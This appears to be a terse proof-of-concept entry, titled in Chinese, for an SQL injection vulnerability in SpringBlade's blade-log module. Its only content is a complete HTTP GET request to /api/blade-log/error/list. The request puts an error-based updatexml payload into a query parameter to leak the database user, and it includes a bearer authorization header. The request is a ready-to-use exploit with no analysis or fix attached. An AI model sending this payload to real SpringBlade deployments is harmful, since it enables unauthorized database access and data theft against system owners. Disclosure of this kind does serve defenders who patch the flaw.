## SpringBlade blade-log存在SQL 注入漏洞


## poc
```
GET /api/blade-log/error/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/json, text/plain, */*
Blade-Auth: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9..UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ
```
